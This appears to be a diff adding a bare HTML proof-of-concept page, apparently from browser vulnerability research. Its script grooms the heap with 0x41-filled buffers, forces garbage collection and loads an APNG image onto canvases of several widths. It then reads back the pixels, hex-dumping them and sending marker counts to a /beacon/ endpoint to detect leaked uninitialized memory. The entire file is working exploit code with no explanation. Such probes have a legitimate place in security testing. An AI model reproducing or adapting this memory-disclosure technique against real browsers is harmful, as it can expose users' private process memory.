@@ -1,0 +1,26 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>apng9</title><script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+function img(url){ return new Promise(function(res){ var i=new Image(); i.onload=function(){res(i);}; i.onerror=function(){res(null);}; i.src=url; }); }
+function hexAll(d,n){ var s=''; for(var i=0;i<n*4;i++) s+=('0'+d[i].toString(16)).slice(-2); return s; }
+function drawN(w,im){ var c=document.createElement('canvas'); c.width=w; c.height=1; var g=c.getContext('2d'); g.drawImage(im,0,0); var d=g.getImageData(0,0,w,1).data; window.__last=c; return d; }
+var seq=0;
+function load(im){ return img('/corpus/'+im+'?n='+(++seq)); }
+function fill(n,size,val){ var a=[]; for(var i=0;i<n;i++){ var u=new Uint8Array(size); for(var j=0;j<size;j++) u[j]=val; a.push(u); } return a; }
+function forceGC(){ for(var i=0;i<10;i++){ var j=new ArrayBuffer(4*1024*1024); j=null; } return 1; }
+function markerCount(d,n,val){ var c=0; for(var i=0;i<n*4;i++) if(d[i]===val) c++; return c; }
+var widths=[16,24,32,48,64,96,128,192,256];
+var k=0;
+function step(){
+  if(k>=widths.length){ b('A9-DONE'); return; }
+  var w=widths[k++];
+  var a=fill(8000,w*4,0x41); a.length=0; a=null; forceGC();
+  load('apng-fw1.png').then(function(im){
+    if(!im){ b('A9-W'+w+'-noimg'); step(); return; }
+    var d=drawN(w,im);
+    b('A9-W'+w+'-m41-'+markerCount(d,w,0x41)+'-hex-'+hexAll(d.slice(0,16*4),16));
+    step();
+  });
+}
+function boot(){ b('A9-BOOT'); step(); }
+boot();
+</script></head><body><p>apng9</p></body></html>
